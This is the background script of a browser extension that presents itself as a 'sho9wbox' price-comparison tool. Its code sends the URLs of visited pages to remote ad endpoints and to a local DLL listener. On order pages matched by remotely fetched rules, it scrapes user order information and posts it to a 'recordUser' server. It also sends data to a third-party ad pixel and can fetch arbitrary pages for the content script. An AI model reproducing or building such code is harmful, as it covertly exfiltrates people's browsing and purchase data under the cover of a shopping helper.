/* ***** background ***** */
const INCLUDE_PAGES_URL = "http://app.sho9wbox.com/plugin/compare/urlrex_2";
const INCLUDE_PAGES_OLDER = "http://app.sho9wbox.com/plugin/compare/ordrex";
const OLDERINFO_SEND_URL = "http://manager.sho9wbox.com/user/recordUser";
const PRICE_COMPARE_URL = 'http://app.sho9wbox.com/plugin/compare/lprice';
const GUESS_COMPARE_URL = "http://app.sho9wbox.com/plugin/guess/yiqifa";
const HAOYE_URL = "http://origin.allyes.com/pixel";
const FIND_ADREMOTE_URL = "http://df.sho9wbox.com/PosterBoard/adRemoteService/findAdRemote";
const FIND_MSREMOTE_URL = "http://df.sho9wbox.com/PosterBoard/msRemoteService/findMsRemote";
const LOCAL_DLLADV_URL = "http://127.0.0.1:50852";

var defaultPriceComparePages = [];
var seperator = "\n";
var judage_local_url = true;
if (!localStorage.priceComparePages) {
    localStorage.priceComparePages = defaultPriceComparePages.join(seperator)
};
localStorage.priceCompareWrapDiv = '';
function updateIncludePage() {
    air.ajax({
        type: "get",
        url: INCLUDE_PAGES_URL,
        timeout: 20000,
        success: function(d) {
            if (!d) return;
            setIncludePages(d)
        },
        error: function() {
            console.log("get include pages error!")
        }
    })
};
function setIncludePages(d) {
    localStorage.priceComparePages = d;
    console.log("include page set==> " + d)
};
function updateOlderPageRule() {
    air.ajax({
        type: "get",
        url: INCLUDE_PAGES_OLDER,
        timeout: 20000,
        success: function(d) {
            if (!d) return;
            var a = {};
            var b = d.split(seperator);
            for (var i = 0; i < b.length; i = i + 2) {
                a[b[i]] = b[i + 1]
            };
            setOlderPageRule(JSON.stringify(a))
        },
        error: function() {
            console.log("get older pages error!")
        }
    })
};
function setOlderPageRule(a) {
    localStorage.olderPageRule = a;
    console.log("older rule set==> " + a)
};
function updateCompareGuessData() {
    air.ajax({
        type: "get",
        url: GUESS_COMPARE_URL,
        data: {
            url: location.href
        },
        timeout: 20000,
        success: function(d) {
            localStorage.priceCompareGuessData = d
        },
        error: function(a, e) {
            console.log("getPageInfoGuessError===>>> \n" + e)
        }
    })
};
updateIncludePage();
updateOlderPageRule();
if (!localStorage.priceCompareGuessData) {
    updateCompareGuessData()
};
chrome.extension.onConnect.addListener(function(g) {
    var h = g.name.split("sho9wbox-split");
    if (h[0] != "priceCompare") {
        return
    };
    var j = h[1];
				var _status = true;
				//init location
				g.postMessage({
            name: "init_location",
            data: j
    });
				g.postMessage({
            name: "postUrlToDll_message",
            data: j
    });
    if (isMatchPricePage(j)) {
        g.postMessage({
            name: "init_price",
            data: {
                appPath: chrome.extension.getURL(''),
            }
        });
        g.postMessage({
            name: "init_mallObj",
            data: {
                mallObj: isMatchPricePage(j),
            }
        });
        g.onMessage.addListener(function(a) {
            if (a.name == "pageInfoGot") {
                postPageInfoToCompare(a.data, g)
            } else if (a.name == "pageInfoGuessGot") {
                postPageInfoGuess(a.data, g)
            } else if (a.name == "getPageContent") {
                getPageContent(a.id, a.url, g)
            } else if (a.name == 'toHaoyeMessage') {
                toHaoyeMessage(a.data)
            }
        })
    } else if (isMatchOlderPage(j)) {
        var k = isMatchOlderPage(j);
        g.postMessage({
            name: "init_older",
            data: {
                appPath: chrome.extension.getURL(''),
                selectorStr: k
            }
        });

        g.postMessage({
            name: "isshowcp",
            data: {
                iscp: true
            }
        });
        g.onMessage.addListener(function(a) {
            if (a.name == "OlderInfoGot") {
                sendOderInfo(a.data)
            };
        })
    } else {
        g.postMessage({
            name: "isshowcp",
            data: {
                iscp: true
            }
        })
    };
				g.onMessage.addListener(function(a) {
							if (a.name == 'postUrlToDll_got') {
         postUrlToDll(a.data)
      	};
    });
    getAdremoteInfo(j, g);
    getMsRemoteInfo(j, g);
    function isMatchPricePage(a) {
        var b = JSON.parse(localStorage.priceComparePages);
        for (var i = 0; i < b.length; i++) {
            if (!b[i]) continue;
            var c = new RegExp(b[i].urlRex);
            if (c.test(a)) {
                localStorage.priceCompareWrapDiv = b[i].wrapDiv;
                return b[i]
            }
        };
        return null
    };
    function isMatchOlderPage(a) {
        if (!localStorage.olderPageRule) return null;
        var o = JSON.parse(localStorage.olderPageRule);
        for (var i in o) {
            var b = new RegExp(i);
            if (b.test(a)) return o[i]
        };
        return null
    };
    function getAdremoteInfo(b, c) {
        air.ajax({
            type: "get",
            url: FIND_ADREMOTE_URL,
            data: {
                url: b
            },
            timeout: 20000,
            success: function(d) {
                c.postMessage({
                    name: "FindAdRemote",
                    data: d,
                })
            },
            error: function(a, e) {
                console.log("getAdremoteInfo===>>> \n" + e)
            }
        })
    };
    function getMsRemoteInfo(b, c) {
        air.ajax({
            type: "get",
            url: FIND_MSREMOTE_URL,
            data: {
                url: b
            },
            timeout: 20000,
            success: function(d) {
                c.postMessage({
                    name: "findMsRemote",
                    data: {
                        _miniset_data: d,
                        _guess_data: localStorage.priceCompareGuessData
                    }
                })
            },
            error: function(a, e) {
                console.log("getAdremoteInfo===>>> \n" + e)
            }
        })
    };
    function postUrlToDll(b) {
        air.ajax({
            type: "get",
            url: LOCAL_DLLADV_URL,
            data: {
                saveurl: b
            },
            timeout: 20000,
            success: function(d) {
														//alert("success");
														//console.log("success");
													},
            error: function(a, e) {
                console.log("postUrlToDll===>>> \n" + e)
            }
        })
    };
    function postPageInfoToCompare(b, c) {
        air.ajax({
            type: "get",
            url: PRICE_COMPARE_URL,
            timeout: 20000,
            data: b,
            success: function(d) {
                var a = JSON.parse(d);
                if (a.status == 200) {
                    c.postMessage({
                        name: "otherPriceGot",
                        data: {
                            _data: d,
                            wrapDiv: localStorage.priceCompareWrapDiv
                        }
                    })
                } else if (a.status == 204) {
                    c.postMessage({
                        name: "selfPriceGot",
                        data: isMatchPricePage(j)
                    });
                    console.log(d.msg)
                } else {
                    c.postMessage({
                        name: "selfPriceGot",
                        data: isMatchPricePage(j)
                    });
                    console.log(d.msg)
                }
            },
            error: function(a, e) {
                console.log("postPageInfoToCompare===>>> \n" + e)
            }
        })
    };
    function getPageContent(b, c, f) {
        air.ajax({
            type: "get",
            url: c,
            timeout: 20000,
            success: function(d) {
                f.postMessage({
                    name: "pageContentGot",
                    data: d,
                    id: b
                })
            },
            error: function(a, e) {
                f.postMessage({
                    name: "pageContentGot",
                    data: null,
                    id: b
                })
            }
        })
    };
    function sendOderInfo(b) {
        air.ajax({
            type: "post",
            url: OLDERINFO_SEND_URL,
            timeout: 20000,
            data: {
                users: JSON.stringify(b).replace(/(\\t)*/g, "").replace(/(\\n)*/g, "").replace(/\s*/g, "")
            },
            success: function(d) {},
            error: function(a, e) {
                console.log(e)
            }
        })
    };
    function postPageInfoGuess(b, c) {
        try {
            air.ajax({
                type: "get",
                url: GUESS_COMPARE_URL,
                data: b,
                timeout: 20000,
                success: function(d) {
                    localStorage.priceCompareGuessData = d;
                    c.postMessage({
                        name: "pageInfoGuess",
                        data: d
                    })
                },
                error: function(a, e) {
                    console.log("getPageInfoGuessError===>>> \n" + e)
                }
            })
        } catch(e) {}
    };
    function toHaoyeMessage(b) {
        b = b.replace(/\b=*/g, "");
        air.ajax({
            type: "get",
            url: HAOYE_URL,
            data: {
                ptr: '2c17d3e5ccd016cbdadaf568dfc3053',
                uid: '',
                s: 1,
                data: b
            },
            timeout: 20000,
            success: function(d) {
                console.log("sendToHaoyeMessageSuccess===>>> \n" + e)
            },
            error: function(a, e) {}
        })
    }
});